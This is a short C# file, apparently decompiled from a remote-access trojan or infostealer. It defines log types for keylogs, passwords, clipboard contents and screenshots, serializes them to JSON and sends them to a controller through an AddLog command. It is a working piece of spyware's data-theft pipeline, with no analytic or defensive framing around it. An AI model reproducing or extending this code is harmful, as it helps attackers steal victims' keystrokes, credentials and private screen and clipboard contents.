using System.Runtime.CompilerServices;
using JSONSerializer;

internal class Logs
{
	public class Log
	{
		public LogType Type;

		public object Data;

		public Log(LogType Type, object Data)
		{
			this.Type = Type;
			this.Data = RuntimeHelpers.GetObjectValue(Data);
		}

		public Types.JSONObject ToJSON()
		{
			Types.JSONObject jSONObject = new Types.JSONObject();
			Types.JSONObject jSONObject2 = jSONObject;
			jSONObject2.Add("type", (int)Type);
			jSONObject2.Add("logdata", RuntimeHelpers.GetObjectValue(Data));
			jSONObject2 = null;
			return jSONObject;
		}
	}

	public enum LogType
	{
		Keylog,
		Passwords,
		Clipboard,
		Screenshot
	}

	public static void SendLog(LogType type, object data)
	{
		SendLogs(new Log(type, RuntimeHelpers.GetObjectValue(data)));
	}

	public static void SendLogs(params Log[] logs)
	{
		Types.JSONArray jSONArray = new Types.JSONArray();
		foreach (Log log in logs)
		{
			jSONArray.Add(log.ToJSON());
		}
		Connection.SendCommand(Connection.CommandType.AddLog, jSONArray);
	}
}
